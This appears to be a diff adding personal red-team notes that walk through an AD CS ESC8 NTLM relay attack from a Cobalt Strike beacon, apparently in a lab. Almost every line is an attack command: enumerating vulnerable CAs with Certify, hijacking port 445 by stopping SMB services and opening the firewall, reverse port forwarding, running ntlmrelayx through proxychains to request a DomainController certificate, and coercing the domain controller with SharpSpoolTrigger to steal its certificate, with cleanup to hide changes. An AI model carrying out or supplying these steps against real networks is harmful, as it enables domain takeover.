@@ -1,0 +1,53 @@
+enumerate the CA for vulnerablities
+    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
+    output shows 'ESC8: The CA supports HTTP web enrollment without channel binding.'
+
+now we must start a socks proxy
+    beacon> socks 1080 socks5
+
+confirm if 445 is currently bound
+    beacon> netstat
+    output shows it is bound with PID 4
+
+lets modify lanmanserver to not auto start  
+    beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
+
+now stop the services
+    beacon> sc_stop lanmanserver
+    beacon> sc_stop srv2
+    beacon> sc_stop srvnet
+
+check netstat to show it is unbound
+
+start reverse port forward to bind to 445 and forward to 7445 on the attacker desktop
+    beacon> rportforward_local 445 localhost 7445
+
+port 445 inbound traffic is not always allowed, so we can add a firewall rule
+    beacon> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
+
+run our kali docker container
+    PS C:\Users\Attacker> docker container start -i kali-1
+
+configure proxychains to use cobalt's socks proxy
+    modify last line of /etc/proxychains to 'socks5 10.0.0.5 1080'
+
+use ntlmrelayx and proxychains to relay incoming authentication requests 
+    --# proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+once this is running, coerce the domain controller into authenticating to the current machine
+    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
+
+we will see the request in our kali terminal, once we get the LON-DC-1.pfx file downloaded we can stop ntlmrelayx
+
+cleanup:
+    stop the proxy
+        beacon> socks stop
+    stop the port forward
+        beacon> rportforward stop 445
+    reconfigure the service back to normal:
+        beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
+        beacon> sc_start srvnet
+        beacon> sc_start srv2
+        beacon> sc_start lanmanserver
+    remove firewall rule
+        beacon> powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
